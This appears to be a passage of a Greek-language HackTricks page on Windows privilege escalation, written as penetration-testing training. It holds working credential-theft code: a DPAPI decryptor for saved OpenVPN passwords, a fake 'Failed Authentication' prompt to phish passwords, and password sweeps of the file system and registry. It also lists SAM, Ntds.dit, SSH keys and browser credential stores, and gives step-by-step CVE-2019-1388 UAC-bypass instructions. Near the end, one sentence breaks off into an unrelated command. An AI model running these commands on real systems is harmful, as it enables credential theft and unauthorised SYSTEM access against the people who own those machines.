Χρησιμοποιήστε αυτές τις πληροφορίες για να συνδεθείτε στο δίκτυο OpenVPN.
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Αρχεία καταγραφής

Τα αρχεία καταγραφής (logs) είναι αρχεία που καταγράφουν τις δραστηριότητες και τα γεγονότα που συμβαίνουν σε ένα σύστημα. Αυτά τα αρχεία μπορούν να παρέχουν πολύτιμες πληροφορίες για την ανίχνευση και την αντιμετώπιση προβλημάτων ασφαλείας.

Οι καταγραφές μπορούν να περιλαμβάνουν πληροφορίες όπως αποτυχημένες προσπάθειες σύνδεσης, αλλαγές στις ρυθμίσεις συστήματος, εκτέλεση επικίνδυνων εντολών και πολλά άλλα. Η ανάλυση των αρχείων καταγραφής μπορεί να αποκαλύψει ευπάθειες και αδυναμίες στο σύστημα, καθώς και ενδείξεις για πιθανές επιθέσεις.

Για την εκμετάλλευση του συστήματος, οι επιτιθέμενοι μπορούν να αξιοποιήσουν τις αδυναμίες στην ασφάλεια των αρχείων καταγραφής. Μπορούν να τροποποιήσουν τα αρχεία καταγραφής για να αποκρύψουν τις δραστηριότητές τους ή να παραπλανήσουν τους διαχειριστές του συστήματος.

Για την αποτροπή της εκμετάλλευσης των αρχείων καταγραφής, είναι σημαντικό να λαμβάνονται μέτρα για την προστασία τους. Αυτά τα μέτρα μπορεί να περιλαμβάνουν την περιορισμένη πρόσβαση στα αρχεία καταγραφής, την κρυπτογράφηση των αρχείων καταγραφής και την επανεξέταση των δικαιωμάτων πρόσβασης στα αρχεία καταγραφής.

Επιπλέον, είναι σημαντικό να παρακολουθούνται τα αρχεία καταγραφής για την έγκαιρη ανίχνευση και αντίδραση σε ενδεχόμενες απειλές ασφαλείας. Η αυτοματοποιημένη ανάλυση των αρχείων καταγραφής μπορεί να βοηθήσει στην αναγνώριση ανωμαλιών και στην ανίχνευση επιθέσεων.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισάγει τα διαπιστευτήριά του ή ακόμα και τα διαπιστευτήρια ενός διαφορετικού χρήστη** αν πιστεύετε ότι μπορεί να τα γνωρίζει (προσέξτε ότι η **ζήτηση** απευθείας από τον **πελάτη** των **διαπιστευτηρίων** είναι πραγματικά **επικίνδυνη**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά ονόματα αρχείων που περιέχουν διαπιστευτήρια**

Γνωστά αρχεία που περιείχαν κάποτε **κωδικούς πρόσβασης** σε **καθαρό κείμενο** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Αναζητήστε όλα τα προτεινόμενα αρχεία:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Θα πρέπει επίσης να ελέγξετε τον Κάδο Ανακύκλωσης για να βρείτε διαπιστευτήρια μέσα σε αυτόν.

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Μέσα στο μητρώο

**Άλλα πιθανά κλειδιά μητρώου με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Εξαγωγή κλειδιών openssh από το μητρώο.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό περιηγητή

Θα πρέπει να ελέγξετε για βάσεις δεδομένων όπου αποθηκεύονται κωδικοί πρόσβασης από τον **Chrome ή το Firefox**.\
Επίσης, ελέγξτε το ιστορικό, τα σελιδοδείκτες και τα αγαπημένα των περιηγητών, ίσως εκεί αποθηκεύονται κάποιοι **κωδικοί πρόσβασης**.

Εργαλεία για την εξαγωγή κωδικών πρόσβασης από περιηγητές:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Αντικατάσταση COM DLL**

Το **Component Object Model (COM)** είναι μια τεχνολογία που υπάρχει εντός του λειτουργικού συστήματος Windows και επιτρέπει την **αλληλεπίδραση** μεταξύ συστατικών λογισμικού διαφορετικών γλωσσών. Κάθε συστατικό COM **αναγνωρίζεται μέσω ενός αναγνωριστικού κλάσης (CLSID)** και κάθε συστατικό εκθέτει λειτουργικότητα μέσω ενός ή περισσότερων διεπαφών, που αναγνωρίζονται μέσω αναγνωριστικών διεπαφών (IIDs).

Οι κλάσεις COM και οι διεπαφές ορίζονται στο μητρώο κάτω από **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** και **HKEY\_**_**CLASSES\_**_**ROOT\Interface** αντίστοιχα. Αυτό το μητρώο δημιουργείται συγχωνεύοντας τα **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Μέσα στα CLSIDs αυτού του μητρώου μπορείτε να βρείτε το παιδικό μητρώο **InProcServer32** που περιέχει μια **προεπιλεγμένη τιμή** που δείχνει σε ένα **DLL** και μια τιμή που ονομάζεται **ThreadingModel** που μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ή **Neutral** (Thread Neutral).

![](<../../.gitbook/assets/image (638).png>)

Βασικά, αν μπορείτε να **αντικαταστήσετε οποιοδήποτε από τα DLLs** που θα εκτελεστούν, μπορείτε να **αναβαθμίσετε τα δικαιώματα** αν αυτό το DLL θα εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι επιτιθέμενοι χρησιμοποιούν την COM Hijacking ως μηχανισμό διαρκούς παραμονής, ελέγξτε:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Γενική αναζήτηση κωδικών πρόσβασης σε αρχεία και μητρώο**

**Αναζήτηση περιεχομένου αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση για ένα αρχείο με συγκεκριμένο όνομα αρχείου**

Για να αναζητήσετε ένα αρχείο με συγκεκριμένο όνομα αρχείου στο σύστημα των Windows, μπορείτε να χρησιμοποιήσετε την εντολή `dir` με την παράμετρο `/s` για αναδρομική αναζήτηση σε όλους τους φακέλους. Παρακάτω παρουσιάζεται η σύνταξη της εντολής:

```plaintext
dir /s /b "Διαδρομή\ΌνομαΑρχείου"
```

- Η παράμετρος `/s` εκτελεί αναδρομική αναζήτηση σε όλους τους φακέλους και υποφακέλους.
- Η παράμετρος `/b` εμφανίζει μόνο τα ονόματα των αρχείων.

Αντικαταστήστε την `"Διαδρομή\ΌνομαΑρχείου"` με την πραγματική διαδρομή και το όνομα του αρχείου που αναζητάτε. Η εντολή θα εμφανίσει την πλήρη διαδρομή του αρχείου, αν βρεθεί στο σύστημα.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζήτηση στο μητρώο για ονόματα κλειδιών και κωδικούς πρόσβασης**

Μπορείτε να χρησιμοποιήσετε το μητρώο των Windows για να αναζητήσετε ονόματα κλειδιών και κωδικούς πρόσβασης. Αυτό μπορεί να σας βοηθήσει να εντοπίσετε πιθανές ευπάθειες ασφαλείας και να αναβαθμίσετε τα δικαιώματά σας.

Για να αναζητήσετε στο μητρώο, μπορείτε να χρησιμοποιήσετε την εντολή `reg query` στο Command Prompt. Παρακάτω παρέχεται ένα παράδειγμα:

```plaintext
reg query HKLM /f "password" /t REG_SZ /s
```

Αυτή η εντολή θα αναζητήσει το κλειδί "password" σε όλο το μητρώο του HKEY_LOCAL_MACHINE (HKLM) και θα εμφανίσει τα αποτελέσματα.

Μπορείτε να προσαρμόσετε την εντολή ανάλογα με τις ανάγκες σας, αναζητώντας διάφορους όρους ή αλλάζοντας το κλειδί που αναζητείτε.

Προσέξτε ότι η αναζήτηση στο μητρώο μπορεί να απαιτεί δικαιώματα διαχειριστή.
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν κωδικούς πρόσβασης

Το [**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) είναι ένα πρόσθετο του msf που δημιούργησα για να εκτελεί αυτόματα κάθε μονάδα POST του metasploit που αναζητά διαπιστευτήρια μέσα στο θύμα.\
Το [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν κωδικούς πρόσβασης που αναφέρονται σε αυτήν τη σελίδα.\
Το [**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμα εξαιρετικό εργαλείο για την εξαγωγή κωδικών πρόσβασης από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **συνεδρίες**, **ονόματα χρηστών** και **κωδικούς πρόσβασης** από διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε καθαρό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY και RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Διαρροές Χειριστών

Φανταστείτε ότι **ένας διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διεργασία **δημιουργεί επίσης μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά προνόμια αλλά κληρονομώντας όλους τους ανοιχτούς χειριστές της κύριας διεργασίας**.\
Στη συνέχεια, αν έχετε **πλήρη πρόσβαση στη διεργασία με χαμηλά προνόμια**, μπορείτε να αποκτήσετε τον **ανοιχτό χειριστή προς την προνομιούχα διεργασία που δημιουργήθηκε** με τη χρήση της `OpenProcess()` και να **ενθετίσετε ένα shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με **το πώς να ανιχνεύσετε και να εκμεταλλευτείτε αυτήν την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτήν την **άλλη ανάρτηση για μια πιο πλήρη εξήγηση σχετικά με το πώς να δοκιμάσετε και να καταχραστείτε περισσότερους ανοιχτούς χειριστές διεργασιών και νημάτων που κληρονομούνται με διάφορα επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Παραπομπή Πελάτη Ονομασμένου Σωλήνα

Οι κοινόχρηστες τμήματα μνήμης, γνωστά ως **σωλήνες**, επιτρέπουν την επικοινωνία διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Ονομασμένοι Σωλήνες**, που επιτρέπει σε ασυνδέτους διεργασίες να μοιράζονται δεδομένα, ακόμα και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με μια αρχιτεκτονική πελάτη/εξυπηρετητή, με ρόλους που καθορίζονται ως **εξυπηρετητής ονομασμένου σωλήνα** και **πελάτης ονομασμένου σωλήνα**.

Όταν δεδομένα αποστέλλονται μέσω ενός σωλήνα από έναν **πελάτη**, ο **εξυπηρετητής** που έχει δημιουργήσει το σωλήνα έχει τη δυνατότητα να **πάρει την ταυτότητα** του **πελάτη**, υποθέτοντας ότι έχει τα απαραίτητα δικαιώματα **SeImpersonate**. Αν εντοπίσετε μια **προνομιούχα διεργασία** που επικοινωνεί μέσω ενός σωλήνα που μπορείτε να προσομοιώσετε, έχετε την ευκαιρία να **αποκτήσετε υψηλότερα προνόμια** αν αναλάβετε την ταυτότητα αυτής της διεργασίας μόλις αλληλεπιδράσει με το σωλήνα που έχετε δημιουργήσει. Για οδηγίες για την εκτέλεση μιας τέτοιας επίθεσης, μπορείτε να βρείτε χρήσιμους οδηγούς [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](./#from-high-integrity-to-system).

Επίσης, το παρακάτω εργαλείο επιτρέπει την **παρεμβολή σε μια επικοινωνία ονομασμένου σωλήνα με ένα εργαλείο όπως το burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει τη λίστα και την προβολή όλων των σωλήνων για εύρεση προνομιούχων δικαιωμάτων** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Διάφορα

### **Παρακολούθηση γραμμών εντολών για κωδικούς πρόσβασης**

Όταν αποκτάτε ένα κέλυφος ως χρήστης, μπορεί να εκτελούνται προγραμματισμένες εργασίες ή άλλες διεργασίες που **περνούν διαπιστευτήρια στη γραμμή εντολών**. Το παρακάτω σενάριο καταγράφει τις γραμμές εντολών των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας οποιεσδήποτε διαφορές.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Από χρήστη με χαμηλά προνόμια σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / Παράκαμψη UAC

Εάν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω κονσόλας ή RDP) και ο UAC είναι ενεργοποιημένος, σε ορισμένες εκδόσεις των Microsoft Windows είναι δυνατόν να εκτελέσετε ένα τερματικό ή οποιαδήποτε άλλη διεργασία ως "NT\AUTHORITY SYSTEM" από έναν μη προνομιούχο χρήστη.

Αυτό καθιστά δυνατή την ανέλιξη προνομίων και την παράκαμψη του UAC ταυτόχρονα με την ίδια ευπάθεια. Επιπλέον, δεν χρειάζεται να εγκαταστήσετε οτιδήποτε και το δυαδικό που χρησιμοποιείται κατά τη διάρκεια της διαδικασίας είναι υπογεγραμμένο και εκδόθηκε από τη Microsoft.

Ορισμένα από τα επηρεαζόμενα συστήματα είναι τα εξής:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια, είναι απαραίτητο να ακολουθήσετε τα παρακάτω βήματα:

```
1) Δεξί κλικ στο αρχείο HHUPD.EXE και εκτέλεση ως Διαχειριστής.

2) Όταν εμφανιστεί το παράθυρο UAC, επιλέξτε "Εμφάνιση περισσότερων λεπτομερειών".

3) Κάντε κλικ στο "Εμφάνιση πληροφοριών πιστοποιητικού εκδότη".

4) Εάν το σύστημα είναι ευπάθεια, όταν κάνετε κλικ στον σύνδεσμο URL "Εκδόθηκε από", μπορεί να εμφανιστεί ο προεπιλεγμένος περιηγητής ιστού.

5) Περιμένετε να φορτωθεί πλήρως η ιστοσελίδα και επιλέξτε "Αποθήκευση ως" για να εμφανιστεί ένα παράθυρο explorer.exe.

6) Στη διαδρομή της γραμμής διευθύνσεων του παραθύρου explorer, εισαγάγετε cmd.exe, powershell.exe ή οποιαδήποτε άλλη διαδραστική διεργασία.

7) Τώρα θα έχετε ένα προνόμιο εντολών "NT\AUTHORITY SYSTEM".

8) Θυμηθείτε να ακυρώσετε την εγκατάσταση και το παράθυρο UAC για να επιστρέψετε στην επιφάνεια εργασίας σας.
```

Έχετε όλα τα απαραίτητα αρχεία και πληροφορίες στο ακόλουθο αποθετήριο GitHub:

https://github.com/jas502n/CVE-2019-1388

## Από τον Διαχειριστή Medium σε High Integrity Level / Παράκαμψη UAC

Διαβάστε αυτό για να **μάθετε για τα Επίπεδα Ακεραιότητας**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Στη συνέχεια, **διαβάστε αυτό για να μάθετε για το UAC και τις παρακάμψεις UAC:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **Από το High Integrity στο System**

### **Νέα υπηρεσία**

Εάν ήδη εκτελείτε μια διαδικασία High Integrity, η μετάβαση σε SYSTEM μπορεί να είναι εύκολη απλά **δημιουργώντας και εκτελώντας μια νέα υπηρεσία**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Από ένα διεργασία υψηλής ακεραιότητας μπορείτε να προσπαθήσετε να **ενεργοποιήσετε τις καταχωρήσεις του μητρώου AlwaysInstallElevated** και να **εγκαταστήσετε** ένα αντίστροφο κέλυφος χρησιμοποιώντας έναν _**.msi**_ περιτυλιγμένο.\
[Περισσότερες πληροφορίες σχετικά με τα κλειδιά του μητρώου που εμπλέκονται και πώς να εγκαταστήσετε ένα πακέτο _.msi_ εδώ.](./#alwaysinstallelevated)

### Υψηλή + SeImpersonate προνόμια σε System

**Μπορείτε** [**να βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### Από SeDebug + SeImpersonate σε πλήρη δικαιώματα Token

Εάν έχετε αυτά τα δικαιώματα token (πιθανώς θα βρείτε αυτό σε μια ήδη διεργασία υψηλής ακεραιότητας), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (μη προστατευμένες διεργασίες) με το δικαίωμα SeDebug, **αντιγράψετε το token** της διεργασίας και δημιουργήστε μια **αυθαίρετη διεργασία με αυτό το token**.\
Χρησιμοποιώντας αυτήν την τεχνική συνήθως επιλέγεται οποιαδήποτε διεργασία που εκτελείται ως SYSTEM με όλα τα δικαιώματα token (_ναι, μπορείτε να βρείτε διεργασίες SYSTEM χωρίς όλα τα δικαιώματα token_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Ονομασμένα αγωγοί**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για να αναβαθμίσει σε `getsystem`. Η τεχνική αποτελείται από το **δημιουργία ενός αγωγού και στη συνέχεια τη δημιουργία/κατάχρηση ενός υπηρεσίας για να γράψει σε αυτόν τον αγωγό**. Στη συνέχεια, ο **διακομιστής** που δημιούργησε τον αγωγό χρησιμοποιώντας το δικαίωμα **`SeImpersonate`** θα μπορεί να **προσομοιώσει το token** του πελάτη του αγωγού (η υπηρεσία) και να αποκτήσει δικαιώματα SYSTEM.\
Εάν θέλετε να [**μάθετε περισσότερα για τους ονομασμένους αγωγούς, πρέπει να διαβάσετε αυτό**](./#named-pipe-client-impersonation).\
Εάν θέλετε να διαβάσετε ένα παράδειγμα [**πώς να πάτε από υψηλή ακεραιότητα σε System χρησιμοποιώντας ονομασμένους αγωγούς, πρέπει να διαβάσετε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Εάν καταφέρετε να **καταχωρήσετε κακόβουλο κώδικα** σε μια **διεργασία** που εκτελείται ως **SYSTEM**, θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα δικαιώματα. Επομένως, η Dll Hijacking είναι επίσης χρήσιμη για αυτήν την είδους ανέλιξη προνομίων και, επιπλέον, είναι πολύ **ευκολότερο να επιτευχθεί από μια διεργασία υψηλής ακεραιότητας**, καθώς θα έχει **δικαιώματα εγγραφής** στους φακέλους που χρησιμοποιούνται για τη φόρτωση των dlls.\
**Μπορείτε** [**να μάθετε περισσότερα για την Dll hijacking εδώ**](dll-hijacking.md)**.**

### **Από Διαχειριστής ή Δικτυακή Υπηρεσία σε System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Από ΤΟΠΙΚΗ ΥΠΗΡΕΣΙΑ ή ΔΙΚΤΥΑΚΗ ΥΠΗΡΕΣΙΑ σε πλήρη δικαιώματα

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Στατικά δυαδικά αρχεία impacket](https://github.com/ropnop/impacket\_static\_binaries)

## Χρήσιμα εργαλεία

**Το καλύτερο εργαλείο για την αναζήτηση διαδρομών αν
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Βιβλιογραφία

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
